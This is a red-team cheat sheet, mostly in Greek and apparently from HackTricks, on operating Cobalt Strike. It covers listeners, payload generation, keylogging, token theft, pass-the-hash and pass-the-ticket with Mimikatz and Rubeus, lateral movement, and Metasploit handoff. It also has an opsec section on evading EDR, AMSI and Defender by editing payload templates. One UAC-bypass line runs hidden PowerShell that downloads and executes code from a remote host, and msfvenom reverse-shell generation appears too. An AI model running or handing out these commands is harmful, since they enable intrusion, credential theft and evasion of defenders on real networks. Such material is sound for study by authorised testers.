# Cobalt Strike

{{#include /banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` τότε μπορείτε να επιλέξετε πού να ακούσετε, ποιο είδος beacon να χρησιμοποιήσετε (http, dns, smb...) και άλλα.

### Peer2Peer Listeners

Τα beacons αυτών των listeners δεν χρειάζεται να μιλούν απευθείας στο C2, μπορούν να επικοινωνούν μέσω άλλων beacons.

`Cobalt Strike -> Listeners -> Add/Edit` τότε πρέπει να επιλέξετε τα TCP ή SMB beacons

* Το **TCP beacon θα ρυθμίσει έναν listener στην επιλεγμένη θύρα**. Για να συνδεθείτε σε ένα TCP beacon χρησιμοποιήστε την εντολή `connect <ip> <port>` από άλλο beacon
* Το **smb beacon θα ακούει σε ένα pipename με το επιλεγμένο όνομα**. Για να συνδεθείτε σε ένα SMB beacon πρέπει να χρησιμοποιήσετε την εντολή `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** για αρχεία HTA
* **`MS Office Macro`** για ένα έγγραφο office με μακροεντολή
* **`Windows Executable`** για ένα .exe, .dll ή service .exe
* **`Windows Executable (S)`** για ένα **stageless** .exe, .dll ή service .exe (καλύτερα stageless από staged, λιγότερα IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Αυτό θα δημιουργήσει ένα script/executable για να κατεβάσει το beacon από το cobalt strike σε μορφές όπως: bitsadmin, exe, powershell και python

#### Host Payloads

Αν έχετε ήδη το αρχείο που θέλετε να φιλοξενήσετε σε έναν web server απλά πηγαίνετε στο `Attacks -> Web Drive-by -> Host File` και επιλέξτε το αρχείο για φιλοξενία και τη ρύθμιση του web server.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Σημειώστε ότι για να φορτώσετε assemblies μεγαλύτερα από 1MB, η ιδιότητα 'tasks_max_size' του malleable profile πρέπει να τροποποιηθεί.

# Screenshots
printscreen    # Πάρτε μια μόνο screenshot μέσω της μεθόδου PrintScr
screenshot     # Πάρτε μια μόνο screenshot
screenwatch    # Πάρτε περιοδικές screenshots της επιφάνειας εργασίας
## Πηγαίνετε στο View -> Screenshots για να τις δείτε

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes για να δείτε τα πλήκτρα που πατήθηκαν

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Εισάγετε την ενέργεια portscan μέσα σε άλλη διαδικασία
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Αυτό χρησιμοποιεί την υψηλότερη υποστηριζόμενη έκδοση powershell (όχι oppsec)
powerpick <cmdlet> <args> # Αυτό δημιουργεί μια θυσιαστική διαδικασία που καθορίζεται από το spawnto, και εισάγει UnmanagedPowerShell σε αυτήν για καλύτερο opsec (όχι logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Αυτό εισάγει UnmanagedPowerShell στη συγκεκριμένη διαδικασία για να εκτελέσει την PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Δημιουργία token για να προσποιηθείτε έναν χρήστη στο δίκτυο
ls \\computer_name\c$ # Δοκιμάστε να χρησιμοποιήσετε το παραγόμενο token για να αποκτήσετε πρόσβαση στο C$ σε έναν υπολογιστή
rev2self # Σταματήστε να χρησιμοποιείτε το token που δημιουργήθηκε με make_token
## Η χρήση του make_token δημιουργεί το γεγονός 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς. Αυτό το γεγονός είναι πολύ κοινό σε ένα Windows domain, αλλά μπορεί να περιοριστεί φιλτράροντας τον Τύπο Σύνδεσης. Όπως αναφέρθηκε παραπάνω, χρησιμοποιεί το LOGON32_LOGON_NEW_CREDENTIALS που είναι τύπος 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Όπως το make_token αλλά κλέβοντας το token από μια διαδικασία
steal_token [pid] # Επίσης, αυτό είναι χρήσιμο για ενέργειες δικτύου, όχι τοπικές ενέργειες
## Από την τεκμηρίωση API γνωρίζουμε ότι αυτός ο τύπος σύνδεσης "επιτρέπει στον καλούντα να κλωνοποιήσει το τρέχον token του". Γι' αυτό η έξοδος Beacon λέει Προσωποποιημένο <current_username> - προσποιείται το κλωνοποιημένο token μας.
ls \\computer_name\c$ # Δοκιμάστε να χρησιμοποιήσετε το παραγόμενο token για να αποκτήσετε πρόσβαση στο C$ σε έναν υπολογιστή
rev2self # Σταματήστε να χρησιμοποιείτε το token από steal_token

## Launch process with new credentials
spawnas [domain\username] [password] [listener] #Κάντε το από έναν κατάλογο με δικαιώματα ανάγνωσης όπως: cd C:\
## Όπως το make_token, αυτό θα δημιουργήσει το γεγονός Windows 4624: Ένας λογαριασμός συνδέθηκε επιτυχώς αλλά με τύπο σύνδεσης 2 (LOGON32_LOGON_INTERACTIVE). Θα αναφέρει τον καλούντα χρήστη (TargetUserName) και τον προσωποποιημένο χρήστη (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## Από την άποψη του OpSec: Μην εκτελείτε διασυνοριακή ένεση εκτός αν είναι απολύτως απαραίτητο (π.χ. x86 -> x64 ή x64 -> x86).

## Pass the hash
## Αυτή η διαδικασία τροποποίησης απαιτεί την επιδιόρθωση της μνήμης LSASS, η οποία είναι μια ενέργεια υψηλού κινδύνου, απαιτεί τοπικά δικαιώματα διαχειριστή και δεν είναι πάντα εφικτή αν είναι ενεργοποιημένη η Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Χωρίς /run, το mimikatz δημιουργεί ένα cmd.exe, αν εκτελείτε ως χρήστης με Desktop, θα δει το shell (αν εκτελείτε ως SYSTEM είστε εντάξει)
steal_token <pid> #Κλέψτε το token από τη διαδικασία που δημιουργήθηκε από το mimikatz

## Pass the ticket
## Ζητήστε ένα εισιτήριο
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Δημιουργήστε μια νέα συνεδρία σύνδεσης για να χρησιμοποιήσετε με το νέο εισιτήριο (για να μην αντικαταστήσετε το παραβιασμένο)
make_token <domain>\<username> DummyPass
## Γράψτε το εισιτήριο στη μηχανή του επιτιθέμενου από μια συνεδρία poweshell & φορτώστε το
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Δημιουργήστε μια νέα διαδικασία με το εισιτήριο
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Κλέψτε το token από αυτή τη διαδικασία
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump interesting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Τέλος, κλέψτε το token από αυτή τη νέα διαδικασία
steal_token <pid>

# Lateral Movement
## Αν έχει δημιουργηθεί ένα token θα χρησιμοποιηθεί
jump [method] [target] [listener]
## Μέθοδοι:
## psexec                    x86   Χρησιμοποιήστε μια υπηρεσία για να εκτελέσετε ένα Service EXE artifact
## psexec64                  x64   Χρησιμοποιήστε μια υπηρεσία για να εκτελέσετε ένα Service EXE artifact
## psexec_psh                x86   Χρησιμοποιήστε μια υπηρεσία για να εκτελέσετε μια PowerShell one-liner
## winrm                     x86   Εκτελέστε ένα PowerShell script μέσω WinRM
## winrm64                   x64   Εκτελέστε ένα PowerShell script μέσω WinRM
## wmi_msbuild               x64   wmi lateral movement με msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec δεν επιστρέφει έξοδο
## Μέθοδοι:
## psexec                          Απομακρυσμένη εκτέλεση μέσω Service Control Manager
## winrm                           Απομακρυσμένη εκτέλεση μέσω WinRM (PowerShell)
## wmi                             Απομακρυσμένη εκτέλεση μέσω WMI

## Για να εκτελέσετε ένα beacon με wmi (δεν είναι στην εντολή jump) απλά ανεβάστε το beacon και εκτελέστε το
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Στον host του metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Στο cobalt: Listeners > Add και ρυθμίστε το Payload σε Foreign HTTP. Ρυθμίστε το Host σε 10.10.5.120, την Θύρα σε 8080 και κάντε κλικ στο Save.
beacon> spawn metasploit
## Μπορείτε να δημιουργήσετε μόνο x86 Meterpreter sessions με τον ξένο listener.

# Pass session to Metasploit - Through shellcode injection
## Στον host του metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Εκτελέστε το msfvenom και προετοιμάστε τον listener multi/handler

## Αντιγράψτε το bin αρχείο στον host του cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Εισάγετε τον κώδικα shell του metasploit σε μια διαδικασία x64

# Pass metasploit session to cobalt strike
## Δημιουργήστε stageless Beacon shellcode, πηγαίνετε στο Attacks > Packages > Windows Executable (S), επιλέξτε τον επιθυμητό listener, επιλέξτε Raw ως τον τύπο εξόδου και επιλέξτε Use x64 payload.
## Χρησιμοποιήστε post/windows/manage/shellcode_inject στο metasploit για να εισάγετε τον παραγόμενο κώδικα shell του cobalt strike


# Pivoting
## Ανοίξτε ένα socks proxy στον teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

Το **`execute-assembly`** χρησιμοποιεί μια **θυσιαστική διαδικασία** χρησιμοποιώντας απομακρυσμένη ένεση διαδικασίας για να εκτελέσει το υποδεικνυόμενο πρόγραμμα. Αυτό είναι πολύ θορυβώδες καθώς για να εισαχθεί μέσα σε μια διαδικασία χρησιμοποιούνται ορισμένα Win APIs που ελέγχει κάθε EDR. Ωστόσο, υπάρχουν μερικά προσαρμοσμένα εργαλεία που μπορούν να χρησιμοποιηθούν για να φορτώσουν κάτι στην ίδια διαδικασία:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Στο Cobalt Strike μπορείτε επίσης να χρησιμοποιήσετε BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Το script aggressor `https://github.com/outflanknl/HelpColor` θα δημιουργήσει την εντολή `helpx` στο Cobalt Strike που θα βάζει χρώματα στις εντολές υποδεικνύοντας αν είναι BOFs (πράσινο), αν είναι Frok&Run (κίτρινο) και παρόμοια, ή αν είναι ProcessExecution, injection ή παρόμοια (κόκκινο). Αυτό βοηθάει να γνωρίζετε ποιες εντολές είναι πιο κρυφές.

### Act as the user

Μπορείτε να ελέγξετε γεγονότα όπως `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Ελέγξτε όλες τις διαδραστικές συνδέσεις για να γνωρίζετε τις συνήθεις ώρες λειτουργίας.
- System EID 12,13 - Ελέγξτε τη συχνότητα τερματισμού/εκκίνησης/ύπνου.
- Security EID 4624/4625 - Ελέγξτε τις έγκυρες/μη έγκυρες NTLM προσπάθειες εισόδου.
- Security EID 4648 - Αυτό το γεγονός δημιουργείται όταν χρησιμοποιούνται απλές διαπιστευτήρια για σύνδεση. Αν μια διαδικασία το δημιούργησε, το δυαδικό αρχείο πιθανώς έχει τα διαπιστευτήρια σε καθαρό κείμενο σε ένα αρχείο ρυθμίσεων ή μέσα στον κώδικα.

Όταν χρησιμοποιείτε `jump` από το cobalt strike, είναι καλύτερο να χρησιμοποιήσετε τη μέθοδο `wmi_msbuild` για να κάνετε τη νέα διαδικασία να φαίνεται πιο νόμιμη.

### Use computer accounts

Είναι κοινό για τους υπερασπιστές να ελέγχουν περίεργες συμπεριφορές που προκύπτουν από χρήστες και **να εξαιρούν λογαριασμούς υπηρεσιών και λογαριασμούς υπολογιστών όπως `*$` από την παρακολούθησή τους**. Μπορείτε να χρησιμοποιήσετε αυτούς τους λογαριασμούς για να εκτελέσετε πλευρική κίνηση ή κλιμάκωση δικαιωμάτων.

### Use stageless payloads

Τα stageless payloads είναι λιγότερο θορυβώδη από τα staged γιατί δεν χρειάζεται να κατεβάσουν μια δεύτερη φάση από τον C2 server. Αυτό σημαίνει ότι δεν δημιουργούν καθόλου δικτυακή κίνηση μετά την αρχική σύνδεση, καθιστώντας τα λιγότερο πιθανό να ανιχνευθούν από τις δικτυακές άμυνες.

### Tokens & Token Store

Να είστε προσεκτικοί όταν κλέβετε ή δημιουργείτε tokens γιατί μπορεί να είναι δυνατό για ένα EDR να απαριθμήσει όλα τα tokens όλων των νημάτων και να βρει ένα **token που ανήκει σε διαφορετικό χρήστη** ή ακόμα και σε SYSTEM στη διαδικασία.

Αυτό επιτρέπει την αποθήκευση tokens **ανά beacon** ώστε να μην χρειάζεται να κλέβετε το ίδιο token ξανά και ξανά. Αυτό είναι χρήσιμο για πλευρική κίνηση ή όταν χρειάζεται να χρησιμοποιήσετε ένα κλεμμένο token πολλές φορές:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Όταν κινείστε πλευρικά, συνήθως είναι καλύτερο να **κλέψετε ένα token παρά να δημιουργήσετε ένα νέο** ή να εκτελέσετε μια επίθεση pass the hash.

### Guardrails

Το Cobalt Strike έχει μια δυνατότητα που ονομάζεται **Guardrails** που βοηθά στην αποφυγή της χρήσης ορισμένων εντολών ή ενεργειών που θα μπορούσαν να ανιχνευθούν από τους υπερασπιστές. Οι Guardrails μπορούν να ρυθμιστούν για να αποκλείσουν συγκεκριμένες εντολές, όπως `make_token`, `jump`, `remote-exec`, και άλλες που χρησιμοποιούνται συνήθως για πλευρική κίνηση ή κλιμάκωση δικαιωμάτων.

Επιπλέον, το repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) περιέχει επίσης κάποιες ελέγχους και ιδέες που θα μπορούσατε να εξετάσετε πριν εκτελέσετε ένα payload.

### Tickets encryption

Σε ένα AD να είστε προσεκτικοί με την κρυπτογράφηση των εισιτηρίων. Από προεπιλογή, ορισμένα εργαλεία θα χρησιμοποιούν κρυπτογράφηση RC4 για τα εισιτήρια Kerberos, η οποία είναι λιγότερο ασφαλής από την κρυπτογράφηση AES και από προεπιλογή, τα ενημερωμένα περιβάλλοντα θα χρησιμοποιούν AES. Αυτό μπορεί να ανιχνευθεί από τους υπερασπιστές που παρακολουθούν αδύναμους αλγόριθμους κρυπτογράφησης.

### Avoid Defaults

Όταν χρησιμοποιείτε το Cobalt Strike από προεπιλογή οι σωλήνες SMB θα έχουν το όνομα `msagent_####` και `"status_####`. Αλλάξτε αυτά τα ονόματα. Είναι δυνατό να ελέγξετε τα ονόματα των υπαρχόντων σωλήνων από το Cobalt Strike με την εντολή: `ls \\.\pipe\`

Επιπλέον, με τις συνεδρίες SSH δημιουργείται ένας σωλήνας που ονομάζεται `\\.\pipe\postex_ssh_####`. Αλλάξτε το με `set ssh_pipename "<new_name>";`.

Επίσης στην επίθεση post exploitation οι σωλήνες `\\.\pipe\postex_####` μπορούν να τροποποιηθούν με `set pipename "<new_name>"`.

Στα προφίλ του Cobalt Strike μπορείτε επίσης να τροποποιήσετε πράγματα όπως:

- Αποφυγή χρήσης `rwx`
- Πώς λειτουργεί η συμπεριφορά ένεσης διαδικασίας (ποια APIs θα χρησιμοποιηθούν) στο μπλοκ `process-inject {...}`
- Πώς λειτουργεί το "fork and run" στο μπλοκ `post-ex {…}`
- Ο χρόνος ύπνου
- Το μέγιστο μέγεθος των δυαδικών αρχείων που θα φορτωθούν στη μνήμη
- Το αποτύπωμα μνήμης και το περιεχόμενο DLL με το μπλοκ `stage {...}`
- Η δικτυακή κίνηση

### Bypass memory scanning

Ορισμένα EDRs σαρώνουν τη μνήμη για ορισμένες γνωστές υπογραφές κακόβουλου λογισμικού. Το Cobalt Strike επιτρέπει την τροποποίηση της λειτουργίας `sleep_mask` ως BOF που θα είναι ικανό να κρυπτογραφήσει στη μνήμη την πίσω πόρτα.

### Noisy proc injections

Όταν εισάγετε κώδικα σε μια διαδικασία αυτό είναι συνήθως πολύ θορυβώδες, αυτό συμβαίνει γιατί **κανένας κανονικός διαδικασία δεν εκτελεί συνήθως αυτή την ενέργεια και επειδή οι τρόποι για να το κάνετε αυτό είναι πολύ περιορισμένοι**. Επομένως, μπορεί να ανιχνευθεί από συστήματα ανίχνευσης που βασίζονται στη συμπεριφορά. Επιπλέον, μπορεί επίσης να ανιχνευθεί από EDRs που σαρώνουν το δίκτυο για **νήματα που περιέχουν κώδικα που δεν είναι στο δίσκο** (αν και διαδικασίες όπως οι περιηγητές που χρησιμοποιούν JIT το έχουν αυτό συνήθως). Παράδειγμα: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Όταν δημιουργείτε μια νέα διαδικασία είναι σημαντικό να **διατηρείτε μια κανονική σχέση γονέα-παιδιού** μεταξύ των διαδικασιών για να αποφύγετε την ανίχνευση. Αν το svchost.exec εκτελεί το iexplorer.exe θα φαίνεται ύποπτο, καθώς το svchost.exe δεν είναι γονέας του iexplorer.exe σε ένα κανονικό περιβάλλον Windows.

Όταν δημιουργείται ένα νέο beacon στο Cobalt Strike από προεπιλογή δημιουργείται μια διαδικασία που χρησιμοποιεί **`rundll32.exe`** για να εκτελέσει τον νέο listener. Αυτό δεν είναι πολύ κρυφό και μπορεί να ανιχνευθεί εύκολα από EDRs. Επιπλέον, το `rundll32.exe` εκτελείται χωρίς κανένα επιχείρημα, καθιστώντας το ακόμα πιο ύποπτο.

Με την παρακάτω εντολή Cobalt Strike, μπορείτε να καθορίσετε μια διαφορετική διαδικασία για να δημιουργήσετε το νέο beacon, καθιστώντας το λιγότερο ανιχνεύσιμο:
```bash
spawnto x86 svchost.exe
```
Μπορείτε επίσης να αλλάξετε αυτή τη ρύθμιση **`spawnto_x86` και `spawnto_x64`** σε ένα προφίλ.

### Proxying attackers traffic

Οι επιτιθέμενοι μερικές φορές θα χρειαστεί να είναι σε θέση να εκτελούν εργαλεία τοπικά, ακόμη και σε μηχανές linux και να κάνουν την κίνηση των θυμάτων να φτάσει στο εργαλείο (π.χ. NTLM relay).

Επιπλέον, μερικές φορές για να εκτελέσετε μια επίθεση pass-the-hash ή pass-the-ticket είναι πιο διακριτικό για τον επιτιθέμενο να **προσθέσει αυτό το hash ή το εισιτήριο στη δική του διαδικασία LSASS** τοπικά και στη συνέχεια να προχωρήσει από αυτό αντί να τροποποιήσει μια διαδικασία LSASS μιας μηχανής θύματος.

Ωστόσο, πρέπει να είστε **προσεκτικοί με την παραγόμενη κίνηση**, καθώς μπορεί να στέλνετε ασυνήθιστη κίνηση (kerberos?) από τη διαδικασία της πίσω πόρτας σας. Για αυτό θα μπορούσατε να προχωρήσετε σε μια διαδικασία προγράμματος περιήγησης (αν και θα μπορούσατε να πιαστείτε εισάγοντας τον εαυτό σας σε μια διαδικασία, οπότε σκεφτείτε έναν διακριτικό τρόπο να το κάνετε αυτό).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Αλλαγή κωδικού  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Αλλαγή powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Αλλαγή $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include /banners/hacktricks-training.md}}
